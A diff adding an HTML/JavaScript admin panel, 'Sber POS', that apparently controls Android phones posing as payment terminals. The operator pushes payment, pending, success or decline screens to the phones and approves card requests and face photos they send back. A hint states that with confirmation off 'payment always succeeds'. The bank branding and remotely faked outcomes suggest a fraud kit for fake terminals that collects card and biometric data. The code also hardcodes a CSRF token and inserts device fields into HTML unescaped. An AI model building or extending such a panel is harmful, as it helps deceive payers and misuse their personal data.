@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sber POS — Панель управления</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --border2: #21262d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --blue: #58a6ff;
+  --green: #3fb950;
+  --yellow: #e3b341;
+  --red: #f85149;
+  --purple: #d2a8ff;
+  --orange: #ffa657;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+       background: var(--bg); color: var(--text); min-height: 100vh; }
+
+/* Header */
+header {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 24px;
+  display: flex; align-items: center; gap: 14px;
+  position: sticky; top: 0; z-index: 100;
+}
+header .logo { font-size: 1.2em; font-weight: 700; color: var(--blue); letter-spacing: -0.3px; }
+header .ver { background: #1f6feb33; color: var(--blue); border: 1px solid #1f6feb66;
+              font-size: 0.72em; padding: 2px 8px; border-radius: 20px; }
+header .spacer { flex: 1; }
+header .conn-indicator { display: flex; align-items: center; gap: 6px; font-size: 0.82em; color: var(--muted); }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green);
+       box-shadow: 0 0 6px var(--green); animation: pulse 2s infinite; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+/* Layout */
+.layout { display: grid; grid-template-columns: 340px 1fr; gap: 0; min-height: calc(100vh - 53px); }
+@media (max-width: 900px) { .layout { grid-template-columns: 1fr; } }
+
+/* Sidebar */
+.sidebar {
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  padding: 16px;
+  overflow-y: auto;
+}
+.sidebar h2 { font-size: 0.72em; color: var(--muted); text-transform: uppercase;
+              letter-spacing: 0.08em; margin: 16px 0 8px; }
+.sidebar h2:first-child { margin-top: 0; }
+
+.sidebar-top {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.sidebar-search {
+  position: relative;
+}
+
+.sidebar-search input {
+  width: 100%;
+  padding-right: 42px;
+}
+
+.sidebar-search .search-icon {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--muted);
+  pointer-events: none;
+  font-size: 0.88em;
+}
+
+.sidebar-caption {
+  font-size: 0.74em;
+  color: var(--muted);
+  letter-spacing: 0.04em;
+}
+
+/* Device cards */
+.device-card {
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  border-radius: 10px;
+  padding: 12px;
+  margin-bottom: 8px;
+  cursor: pointer;
+  transition: border-color 0.15s, background 0.15s;
+  position: relative;
+}
+.device-card:hover { border-color: var(--blue); }
+.device-card.active { border-color: var(--blue); background: #1f6feb18; }
+.device-card .tid { font-weight: 700; color: var(--blue); font-size: 0.9em; }
+.device-card .model { font-size: 0.8em; color: var(--muted); margin-top: 3px; }
+.device-card .state-pill { position: absolute; top: 10px; right: 10px; }
+.device-card .seen { font-size: 0.72em; color: var(--muted); margin-top: 4px; }
+.no-devices { color: var(--muted); font-size: 0.85em; text-align: center;
+              padding: 24px 0; border: 1px dashed var(--border); border-radius: 8px; }
+
+/* Broadcast button */
+.btn-broadcast {
+  width: 100%; background: #1f6feb22; border: 1px solid #1f6feb66;
+  color: var(--blue); border-radius: 8px; padding: 10px;
+  cursor: pointer; font-size: 0.85em; font-weight: 600;
+  transition: background 0.15s;
+}
+.btn-broadcast:hover { background: #1f6feb44; }
+.btn-broadcast.active-global { background: #1f6feb; color: #fff; border-color: #1f6feb; }
+
+.btn-show-all {
+  width: 100%;
+  margin-top: 10px;
+  background: linear-gradient(135deg, #1f6feb22, #58a6ff14);
+  border: 1px solid #1f6feb55;
+  color: var(--text);
+  border-radius: 10px;
+  padding: 11px 12px;
+  cursor: pointer;
+  font-size: 0.84em;
+  font-weight: 700;
+  text-align: left;
+}
+
+.btn-show-all:hover {
+  border-color: var(--blue);
+  background: linear-gradient(135deg, #1f6feb33, #58a6ff22);
+}
+
+.btn-show-all span {
+  color: var(--muted);
+  font-weight: 500;
+}
+
+/* Main content */
+.main { padding: 24px; overflow-y: auto; }
+.target-bar {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px 16px;
+  margin-bottom: 20px;
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+}
+.target-bar .label { font-size: 0.8em; color: var(--muted); }
+.target-bar .target-name { font-weight: 700; font-size: 1em; }
+.target-bar .target-name.global { color: var(--orange); }
+.target-bar .target-name.device { color: var(--blue); }
+.target-bar .spacer { flex: 1; }
+.target-bar .clear-btn { font-size: 0.8em; color: var(--muted); cursor: pointer;
+                          background: var(--surface2); border: 1px solid var(--border);
+                          border-radius: 6px; padding: 4px 10px; }
+.target-bar .clear-btn:hover { color: var(--text); }
+
+/* Cards */
+.card { background: var(--surface); border: 1px solid var(--border);
+        border-radius: 12px; padding: 20px; margin-bottom: 16px; }
+.card-title { font-size: 0.75em; color: var(--muted); text-transform: uppercase;
+              letter-spacing: 0.08em; margin-bottom: 16px; }
+
+/* Form */
+label { display: block; font-size: 0.82em; color: var(--muted); margin-bottom: 5px; margin-top: 12px; }
+label:first-child { margin-top: 0; }
+select, input[type=text], input[type=number], textarea {
+  width: 100%; background: var(--bg); border: 1px solid var(--border);
+  border-radius: 8px; color: var(--text); padding: 9px 12px;
+  font-size: 0.88em; outline: none; transition: border-color 0.15s;
+  font-family: inherit;
+}
+select:focus, input:focus, textarea:focus { border-color: var(--blue); }
+textarea { min-height: 76px; resize: vertical; font-family: 'SF Mono', Consolas, monospace; font-size: 0.82em; }
+.extra { display: none; }
+
+/* Buttons */
+.btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  cursor: pointer; border: none; border-radius: 8px; padding: 9px 18px;
+  font-size: 0.88em; font-weight: 600; transition: filter 0.15s; white-space: nowrap;
+}
+.btn:hover { filter: brightness(1.15); }
+.btn:active { filter: brightness(0.9); }
+.btn-primary { background: #1f6feb; color: #fff; }
+.btn-danger  { background: #da3633; color: #fff; }
+.btn-green   { background: #238636; color: #fff; }
+.btn-ghost   { background: var(--surface2); border: 1px solid var(--border); color: var(--text); }
+.btn-row { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+
+/* Quick pay grid */
+.quick-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 10px; }
+.quick-btn {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 10px 6px;
+  cursor: pointer; font-size: 0.82em; font-weight: 600;
+  transition: border-color 0.15s, background 0.15s; text-align: center;
+}
+.quick-btn:hover { border-color: var(--green); background: #23863622; color: var(--green); }
+
+.stats-layout {
+  display: grid;
+  grid-template-columns: 220px 1fr;
+  gap: 18px;
+  align-items: center;
+}
+
+.pie-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.pie-chart {
+  width: 188px;
+  height: 188px;
+  border-radius: 50%;
+  background: conic-gradient(#30363d 0deg 360deg);
+  position: relative;
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06);
+}
+
+.pie-chart::after {
+  content: '';
+  position: absolute;
+  inset: 26px;
+  border-radius: 50%;
+  background: var(--surface);
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.04);
+}
+
+.pie-center {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  z-index: 1;
+  text-align: center;
+}
+
+.pie-center strong {
+  font-size: 1.6em;
+  line-height: 1;
+}
+
+.pie-center span {
+  margin-top: 6px;
+  font-size: 0.74em;
+  color: var(--muted);
+  max-width: 90px;
+}
+
+.stats-legend {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 10px 16px;
+}
+
+.stats-item {
+  display: flex;
+  gap: 10px;
+  align-items: flex-start;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 10px 12px;
+}
+
+.stats-dot {
+  width: 11px;
+  height: 11px;
+  border-radius: 50%;
+  margin-top: 4px;
+  flex-shrink: 0;
+}
+
+.stats-text {
+  min-width: 0;
+}
+
+.stats-name {
+  font-size: 0.84em;
+  font-weight: 700;
+  color: var(--text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.stats-meta {
+  margin-top: 3px;
+  font-size: 0.76em;
+  color: var(--muted);
+}
+
+.stats-empty {
+  color: var(--muted);
+  font-size: 0.84em;
+  padding: 12px 0;
+}
+
+/* State pill */
+.pill {
+  display: inline-block; padding: 2px 9px; border-radius: 20px;
+  font-size: 0.72em; font-weight: 700; letter-spacing: 0.03em;
+}
+.pill-idle    { background: #21262d; color: var(--muted); }
+.pill-pay     { background: #1a472a; color: var(--green); }
+.pill-pending { background: #3d2f00; color: var(--yellow); }
+.pill-text    { background: #1c2e4a; color: var(--blue); }
+.pill-buttons { background: #2d1f4a; color: var(--purple); }
+.pill-face    { background: #3d1a1a; color: var(--red); }
+
+/* Alert */
+.toast {
+  position: fixed; bottom: 24px; right: 24px; z-index: 999;
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 10px; padding: 12px 18px; font-size: 0.88em;
+  box-shadow: 0 8px 32px #00000066;
+  transform: translateY(80px); opacity: 0;
+  transition: transform 0.25s, opacity 0.25s;
+  max-width: 340px;
+}
+.toast.show { transform: translateY(0); opacity: 1; }
+.toast.ok { border-left: 3px solid var(--green); }
+.toast.err { border-left: 3px solid var(--red); }
+
+/* Payload preview */
+.payload-pre {
+  background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
+  padding: 12px; font-family: 'SF Mono', Consolas, monospace; font-size: 0.8em;
+  white-space: pre-wrap; word-break: break-all; color: #a5d6ff; min-height: 48px;
+}
+
+/* API docs table */
+.api-table { width: 100%; border-collapse: collapse; font-size: 0.83em; margin-top: 8px; }
+.api-table td { padding: 7px 10px; border-bottom: 1px solid var(--border2); vertical-align: top; }
+.api-table tr:last-child td { border-bottom: none; }
+.api-table td:first-child { white-space: nowrap; }
+.method { display: inline-block; width: 46px; text-align: center; font-weight: 700;
+          border-radius: 4px; padding: 1px 0; font-size: 0.85em; }
+.m-get  { background: #1c2e4a; color: var(--blue); }
+.m-post { background: #1a472a; color: var(--green); }
+code { background: var(--surface2); border-radius: 4px; padding: 1px 5px;
+       font-family: 'SF Mono', Consolas, monospace; color: var(--text); }
+
+/* Face photo */
+.face-photo-block {
+  margin-top: 10px; padding: 10px; background: var(--bg);
+  border: 1px solid var(--border); border-radius: 8px;
+}
+.face-photo-block img {
+  width: 120px; height: auto; border-radius: 8px;
+  display: block; margin-bottom: 6px;
+  border: 2px solid var(--border);
+}
+.face-photo-block .face-time { font-size: 0.72em; color: var(--muted); margin-bottom: 8px; }
+.face-photo-block .face-btns { display: flex; gap: 6px; }
+
+/* Attach device block */
+.attach-box {
+  margin-top: 10px;
+  padding: 10px;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  background: var(--bg);
+}
+.attach-box .btn {
+  width: 100%;
+  margin-top: 8px;
+}
+
+/* Face confirm toggle */
+.face-confirm-row {
+  display: flex; align-items: center; gap: 10px;
+  padding: 10px 14px; background: var(--bg);
+  border: 1px solid var(--border); border-radius: 8px;
+  margin-bottom: 16px;
+}
+.face-confirm-row .label { font-size: 0.85em; flex: 1; }
+.toggle-switch { position: relative; width: 42px; height: 24px; flex-shrink: 0; }
+.toggle-switch input { opacity: 0; width: 0; height: 0; }
+.toggle-slider {
+  position: absolute; cursor: pointer; inset: 0;
+  background: var(--surface2); border-radius: 24px;
+  border: 1px solid var(--border); transition: background 0.2s;
+}
+.toggle-slider:before {
+  content: ''; position: absolute;
+  width: 16px; height: 16px; left: 3px; top: 3px;
+  background: var(--muted); border-radius: 50%; transition: transform 0.2s, background 0.2s;
+}
+.toggle-switch input:checked + .toggle-slider { background: #1a472a; border-color: var(--green); }
+.toggle-switch input:checked + .toggle-slider:before { transform: translateX(18px); background: var(--green); }
+
+.device-modal {
+  position: fixed;
+  inset: 0;
+  background: rgba(6, 10, 16, 0.78);
+  backdrop-filter: blur(8px);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  z-index: 1200;
+}
+
+.device-modal.open {
+  display: flex;
+}
+
+.device-modal-panel {
+  width: min(1120px, 100%);
+  max-height: min(86vh, 920px);
+  background: linear-gradient(180deg, #151b24 0%, #0f141c 100%);
+  border: 1px solid rgba(88, 166, 255, 0.18);
+  border-radius: 20px;
+  box-shadow: 0 24px 80px rgba(0, 0, 0, 0.45);
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+
+.device-modal-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 18px 22px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+}
+
+.device-modal-title {
+  font-size: 1.05em;
+  font-weight: 700;
+}
+
+.device-modal-subtitle {
+  color: var(--muted);
+  font-size: 0.82em;
+  margin-top: 4px;
+}
+
+.device-modal-spacer {
+  flex: 1;
+}
+
+.device-modal-close {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  color: var(--text);
+  width: 38px;
+  height: 38px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-size: 1.05em;
+}
+
+.device-modal-body {
+  padding: 20px 22px 24px;
+  overflow: auto;
+}
+
+.device-grid {
+  display: grid;
+  grid-template-columns: repeat(4, minmax(0, 1fr));
+  gap: 12px;
+}
+
+.device-grid .device-card {
+  margin-bottom: 0;
+  min-height: 116px;
+}
+
+@media (max-width: 1150px) {
+  .device-grid {
+    grid-template-columns: repeat(3, minmax(0, 1fr));
+  }
+}
+
+@media (max-width: 820px) {
+  .device-modal {
+    padding: 12px;
+  }
+  .device-grid {
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+  }
+}
+
+@media (max-width: 540px) {
+  .device-grid {
+    grid-template-columns: 1fr;
+  }
+}
+
+@media (max-width: 980px) {
+  .stats-layout {
+    grid-template-columns: 1fr;
+  }
+  .stats-legend {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+<body>
+
+<header>
+  <span class="logo">⚡ Sber POS</span>
+  <span class="ver">v1.0</span>
+  <div class="spacer"></div>
+  <div class="conn-indicator">
+    <div class="dot" id="connDot"></div>
+    <span id="connText">онлайн</span>
+  </div>
+  <a href="/logout" style="margin-left:16px;font-size:0.82em;color:var(--muted);text-decoration:none;background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:5px 12px;"
+     onclick="return confirm('Выйти из панели?')">Выйти</a>
+</header>
+
+<div class="layout">
+
+  <!-- Sidebar: device list -->
+  <div class="sidebar">
+    <h2>Устройства</h2>
+    <div class="sidebar-top">
+      <div class="sidebar-search">
+        <input id="terminalSearch" type="text" placeholder="Поиск по TRM-1005" autocomplete="off" oninput="renderDevicesSidebar()">
+        <span class="search-icon">⌕</span>
+      </div>
+      <div class="sidebar-caption">Последние активные 10 устройств</div>
+    </div>
+    <button class="btn-broadcast" id="globalBtn" onclick="selectGlobal()">
+      🌐 Все устройства (глобально)
+    </button>
+    <div id="attachDeviceBox" class="attach-box" style="display:none;">
+      <label for="attachTerminalId">Добавить устройство</label>
+      <input id="attachTerminalId" type="text" placeholder="TRM-1001" autocomplete="off">
+      <label for="attachTerminalPassword">Пароль терминала</label>
+      <input id="attachTerminalPassword" type="text" placeholder="6-значный пароль" autocomplete="off">
+      <button class="btn btn-primary" onclick="attachDevice()">Добавить устройство</button>
+    </div>
+    <div id="devicesList" style="margin-top:10px;">
+      <div class="no-devices">Нет устройств.<br>Запустите приложение.</div>
+    </div>
+    <button class="btn-show-all" id="showAllDevicesBtn" type="button" onclick="openAllDevicesModal()" style="display:none;">
+      Показать все устройства
+      <span id="showAllDevicesMeta">0 устройств</span>
+    </button>
+
+    <h2 style="margin-top:20px;">Текущий глобальный payload</h2>
+    <div class="payload-pre" id="globalPayloadPre">—</div>
+  </div>
+
+  <!-- Main: command panel -->
+  <div class="main">
+
+    <!-- Target bar -->
+    <div class="target-bar">
+      <span class="label">Цель:</span>
+      <span class="target-name global" id="targetLabel">🌐 Все устройства</span>
+      <div class="spacer"></div>
+      <div id="clearOverrideBtn" style="display:none;">
+        <button class="clear-btn" onclick="clearOverride()">✕ Снять override</button>
+      </div>
+    </div>
+
+    <!-- Command form -->
+    <div class="card">
+      <div class="card-title">📡 Команда</div>
+
+      <label>Состояние (state)</label>
+      <select id="stateSelect" onchange="onStateChange()">
+        <option value="idle">idle — Главный экран</option>
+        <option value="pay">pay — Экран оплаты 💳</option>
+        <option value="payPending">payPending — Обработка ⏳</option>
+        <option value="text">text — Текстовый экран 📝</option>
+        <option value="buttons">buttons — Кнопки 🔘</option>
+        <option value="faceRecognition">faceRecognition — Биометрия 👤</option>
+      </select>
+
+      <div id="field_amount" class="extra">
+        <label>Сумма (₽)</label>
+        <input type="number" id="amount" value="1500" min="0" step="0.01" placeholder="1500">
+      </div>
+
+      <div id="field_content" class="extra">
+        <label>Текст</label>
+        <textarea id="content">Оплата прошла успешно</textarea>
+      </div>
+
+      <div id="field_buttons" class="extra">
+        <label>Кнопки — каждая на новой строке: <code>Название:значение</code></label>
+        <textarea id="buttons">Оплатить картой:card
+Оплатить наличными:cash
+Отмена:cancel</textarea>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn btn-primary" onclick="sendCmd()">▶ Отправить</button>
+        <button class="btn btn-danger" onclick="resetAll()">↺ Сброс всех</button>
+      </div>
+    </div>
+
+    <!-- Face confirm settings -->
+    <div class="card" id="faceConfirmCard">
+      <div class="card-title">👤 Биометрия — настройки</div>
+      <div class="face-confirm-row">
+        <span class="label">Требовать подтверждения оплаты через панель</span>
+        <label class="toggle-switch">
+          <input type="checkbox" id="faceConfirmToggle" onchange="setFaceConfirm(this.checked)">
+          <span class="toggle-slider"></span>
+        </label>
+      </div>
+      <div id="faceConfirmHint" style="font-size:0.8em;color:var(--muted);margin-top:4px;">
+        Когда включено: APK отправляет фото, ждёт вашего решения (10 сек таймаут). Когда выключено: оплата всегда проходит успешно.
+      </div>
+    </div>
+
+    <!-- Face photo viewer (shown only when face photo received) -->
+    <div class="card" id="facePhotoCard" style="display:none;">
+      <div class="card-title">📸 Фото лица — ожидает подтверждения</div>
+      <div id="facePhotoContent"></div>
+    </div>
+
+    <!-- Card payment viewer -->
+    <div class="card" id="cardRequestCard" style="display:none;">
+      <div class="card-title">💳 Оплата картой — ожидает подтверждения</div>
+      <div id="cardRequestContent"></div>
+    </div>
+
+    <!-- Quick pay -->
+    <div class="card">
+      <div class="card-title">⚡ Быстрые команды</div>
+      <div class="quick-grid">
+        <div class="quick-btn" onclick="quickPay(100)">💳 100 ₽</div>
+        <div class="quick-btn" onclick="quickPay(500)">💳 500 ₽</div>
+        <div class="quick-btn" onclick="quickPay(1000)">💳 1 000 ₽</div>
+        <div class="quick-btn" onclick="quickPay(5000)">💳 5 000 ₽</div>
+        <div class="quick-btn" onclick="quickPay(10000)">💳 10 000 ₽</div>
+        <div class="quick-btn" onclick="quickPending()">⏳ Pending</div>
+        <div class="quick-btn" onclick="quickText('Оплата принята!')">✅ Успех</div>
+        <div class="quick-btn" onclick="quickText('Оплата отклонена')">❌ Отказ</div>
+        <div class="quick-btn" onclick="quickIdle()">🏠 Idle</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">📊 Топ 10 телефонов</div>
+      <div class="stats-layout">
+        <div class="pie-wrap">
+          <div class="pie-chart" id="phonesPieChart">
+            <div class="pie-center">
+              <strong id="phonesPieCenterValue">0%</strong>
+              <span id="phonesPieCenterLabel">нет данных</span>
+            </div>
+          </div>
+        </div>
+        <div id="phonesLegend" class="stats-legend">
+          <div class="stats-empty">Пока нет данных по устройствам.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- API docs -->
+    <div class="card">
+      <div class="card-title">📖 API</div>
+      <table class="api-table">
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/sber/register_device.php</code></td>
+          <td style="color:var(--muted)">Регистрация устройства</td>
+        </tr>
+        <tr>
+          <td><span class="method m-get">GET</span></td>
+          <td><code>/sber/get_payload.php?terminal_id=&uuid=&appVersion=</code></td>
+          <td style="color:var(--muted)">Polling команды (каждые ~1.3 сек)</td>
+        </tr>
+        <tr>
+          <td><span class="method m-get">GET</span></td>
+          <td><code>/pay?id=XXX</code></td>
+          <td style="color:var(--muted)">Страница QR-кода</td>
+        </tr>
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/admin/set_payload</code></td>
+          <td style="color:var(--muted)">Глобальный payload</td>
+        </tr>
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/admin/set_device_payload</code></td>
+          <td style="color:var(--muted)">Payload для конкретного terminal_id</td>
+        </tr>
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/admin/reset</code></td>
+          <td style="color:var(--muted)">Сброс всех в idle</td>
+        </tr>
+        <tr>
+          <td><span class="method m-get">GET</span></td>
+          <td><code>/admin/status</code></td>
+          <td style="color:var(--muted)">JSON статус</td>
+        </tr>
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/sber/face_photo.php</code></td>
+          <td style="color:var(--muted)">Приём фото лица от APK (multipart)</td>
+        </tr>
+        <tr>
+          <td><span class="method m-get">GET</span></td>
+          <td><code>/sber/face_confirm.php?terminal_id=</code></td>
+          <td style="color:var(--muted)">Polling результата подтверждения</td>
+        </tr>
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/admin/set_face_confirm</code></td>
+          <td style="color:var(--muted)">Включить/выключить подтверждение лица</td>
+        </tr>
+        <tr>
+          <td><span class="method m-post">POST</span></td>
+          <td><code>/admin/confirm_face</code></td>
+          <td style="color:var(--muted)">Подтвердить/отклонить оплату по лицу</td>
+        </tr>
+        <tr>
+          <td><span class="method m-get">GET</span></td>
+          <td><code>/docs</code></td>
+          <td style="color:var(--muted)">Swagger UI (FastAPI)</td>
+        </tr>
+      </table>
+    </div>
+
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<div class="device-modal" id="allDevicesModal" onclick="closeAllDevicesModal(event)">
+  <div class="device-modal-panel" onclick="event.stopPropagation()">
+    <div class="device-modal-header">
+      <div>
+        <div class="device-modal-title">Все устройства</div>
+        <div class="device-modal-subtitle">Выберите терминал для управления</div>
+      </div>
+      <div class="device-modal-spacer"></div>
+      <button class="device-modal-close" type="button" onclick="closeAllDevicesModal()">✕</button>
+    </div>
+    <div class="device-modal-body">
+      <div class="device-grid" id="allDevicesGrid"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────
+let selectedTerminalId = null; // null = global
+let faceConfirmEnabled = true;
+let role = 'terminal';
+let csrfToken = '38bbdcdfd4f34c69ebd483bba47b3a8e394ccdcd0c897ab6';
+let devicesCache = [];
+// Track last rendered face photos to avoid re-rendering buttons on every refresh
+let lastFacePhotoKeys = ''; // JSON string of terminal_id -> received_at
+let lastCardRequestKeys = ''; // JSON string of terminal_id -> received_at
+
+// ── Sidebar: select target ─────────────────────────────────────────────────
+function selectGlobal() {
+  selectedTerminalId = null;
+  document.getElementById('globalBtn').classList.add('active-global');
+  document.querySelectorAll('.device-card').forEach(c => c.classList.remove('active'));
+  document.getElementById('targetLabel').textContent = role === 'admin' ? '🌐 Все устройства' : '🌐 Все мои устройства';
+  document.getElementById('targetLabel').className = 'target-name global';
+  document.getElementById('clearOverrideBtn').style.display = 'none';
+}
+
+function selectDevice(tid) {
+  selectedTerminalId = tid;
+  document.getElementById('globalBtn').classList.remove('active-global');
+  document.querySelectorAll('.device-card').forEach(c => {
+    c.classList.toggle('active', c.dataset.tid === tid);
+  });
+  document.getElementById('targetLabel').textContent = '📱 ' + tid;
+  document.getElementById('targetLabel').className = 'target-name device';
+  document.getElementById('clearOverrideBtn').style.display = 'block';
+}
+
+function scoreDeviceActivity(dev) {
+  const lastSeen = Date.parse((dev.last_seen || '') + 'Z') || 0;
+  const hasPendingFace = dev.face_photo && dev.face_photo.photo_b64 ? 1 : 0;
+  const hasPendingCard = dev.card_request && !dev.card_request.confirmed_at ? 1 : 0;
+  const hasOverride = dev.has_override ? 1 : 0;
+  return (hasPendingFace * 3) + (hasPendingCard * 2) + hasOverride + (lastSeen / 1e13);
+}
+
+function sortDevicesByActivity(devices) {
+  return [...devices].sort((a, b) => {
+    const diff = scoreDeviceActivity(b) - scoreDeviceActivity(a);
+    if (Math.abs(diff) > 0.000001) return diff;
+    return (b.last_seen || '').localeCompare(a.last_seen || '');
+  });
+}
+
+function filterDevicesBySearch(devices) {
+  const query = document.getElementById('terminalSearch').value.trim().toUpperCase();
+  if (!query) return devices;
+  return devices.filter(dev => (dev.terminal_id || '').toUpperCase().includes(query));
+}
+
+function renderDeviceCard(dev, isActive) {
+  const s = dev.current_payload.state;
+  const override = dev.has_override ? ' <span style="color:var(--orange);font-size:0.72em;">override</span>' : '';
+  const hasPhoto = dev.face_photo && dev.face_photo.photo_b64;
+  const photoIndicator = hasPhoto ? ' <span style="color:var(--red);font-size:0.72em;">📸 фото</span>' : '';
+  const hasCardRequest = dev.card_request && !dev.card_request.confirmed_at;
+  const cardIndicator = hasCardRequest ? ' <span style="color:var(--yellow);font-size:0.72em;">💳 карта</span>' : '';
+  const tid = dev.terminal_id;
+  return `<div class="device-card${isActive ? ' active' : ''}" data-tid="${tid}"
+               onclick="selectDevice('${tid}'); closeAllDevicesModal();">
+    <div class="tid">${tid}${override}${photoIndicator}${cardIndicator}</div>
+    <div class="state-pill"><span class="pill pill-${stateClass(s)}">${stateLabel(s)}</span></div>
+    <div class="model">${dev.device_brand} ${dev.device_model} · Android ${dev.android_version}</div>
+    <div class="seen">🕐 ${timeSince(dev.last_seen)}</div>
+  </div>`;
+}
+
+function renderDevicesSidebar() {
+  const sorted = sortDevicesByActivity(devicesCache);
+  const filtered = filterDevicesBySearch(sorted);
+  const recent = filtered.slice(0, 10);
+  const list = document.getElementById('devicesList');
+  const modalGrid = document.getElementById('allDevicesGrid');
+  const showAllBtn = document.getElementById('showAllDevicesBtn');
+  const showAllMeta = document.getElementById('showAllDevicesMeta');
+
+  if (!filtered.length) {
+    list.innerHTML = '<div class="no-devices">Ничего не найдено.<br>Попробуйте другой ID.</div>';
+  } else {
+    list.innerHTML = recent.map(dev => renderDeviceCard(dev, dev.terminal_id === selectedTerminalId)).join('');
+  }
+
+  if (!sorted.length) {
+    showAllBtn.style.display = 'none';
+    modalGrid.innerHTML = '<div class="no-devices">Нет устройств.</div>';
+    return;
+  }
+
+  showAllBtn.style.display = 'block';
+  showAllMeta.textContent = `${filtered.length} из ${sorted.length}`;
+  modalGrid.innerHTML = filtered.map(dev => renderDeviceCard(dev, dev.terminal_id === selectedTerminalId)).join('');
+}
+
+function getPhoneLabel(dev) {
+  const brand = (dev.device_brand || '').trim();
+  const model = (dev.device_model || '').trim();
+  const raw = `${brand} ${model}`.trim();
+  return raw || 'Неизвестное устройство';
+}
+
+function renderPhonesStats(devices) {
+  const legend = document.getElementById('phonesLegend');
+  const pie = document.getElementById('phonesPieChart');
+  const centerValue = document.getElementById('phonesPieCenterValue');
+  const centerLabel = document.getElementById('phonesPieCenterLabel');
+
+  if (!devices.length) {
+    pie.style.background = 'conic-gradient(#30363d 0deg 360deg)';
+    centerValue.textContent = '0%';
+    centerLabel.textContent = 'нет данных';
+    legend.innerHTML = '<div class="stats-empty">Пока нет данных по устройствам.</div>';
+    return;
+  }
+
+  const totals = new Map();
+  devices.forEach(dev => {
+    const label = getPhoneLabel(dev);
+    totals.set(label, (totals.get(label) || 0) + 1);
+  });
+
+  const sorted = [...totals.entries()]
+    .sort((a, b) => b[1] - a[1] || a[0].localeCompare(b[0]))
+    .slice(0, 10);
+
+  const totalCount = devices.length;
+  const palette = ['#58a6ff', '#3fb950', '#e3b341', '#f85149', '#d2a8ff', '#ffa657', '#79c0ff', '#56d364', '#ff7b72', '#a371f7'];
+  let angle = 0;
+  const segments = sorted.map(([name, count], index) => {
+    const color = palette[index % palette.length];
+    const share = count / totalCount;
+    const nextAngle = angle + share * 360;
+    const segment = `${color} ${angle.toFixed(2)}deg ${nextAngle.toFixed(2)}deg`;
+    angle = nextAngle;
+    return { name, count, share, color, segment };
+  });
+
+  if (angle < 360) {
+    segments.push({ segment: `#30363d ${angle.toFixed(2)}deg 360deg`, share: 0, count: 0, color: '#30363d', name: 'Остальные' });
+  }
+
+  pie.style.background = `conic-gradient(${segments.map(s => s.segment).join(', ')})`;
+
+  const leader = sorted[0];
+  const leaderPercent = leader ? Math.round((leader[1] / totalCount) * 100) : 0;
+  centerValue.textContent = `${leaderPercent}%`;
+  centerLabel.textContent = leader ? leader[0] : 'нет данных';
+
+  legend.innerHTML = sorted.map(([name, count], index) => {
+    const percent = ((count / totalCount) * 100).toFixed(1).replace('.0', '');
+    const color = palette[index % palette.length];
+    return `<div class="stats-item">
+      <div class="stats-dot" style="background:${color}"></div>
+      <div class="stats-text">
+        <div class="stats-name" title="${name}">${name}</div>
+        <div class="stats-meta">${count} шт. · ${percent}%</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function openAllDevicesModal() {
+  document.getElementById('allDevicesModal').classList.add('open');
+}
+
+function closeAllDevicesModal(event) {
+  if (event && event.target && event.target !== document.getElementById('allDevicesModal')) return;
+  document.getElementById('allDevicesModal').classList.remove('open');
+}
+
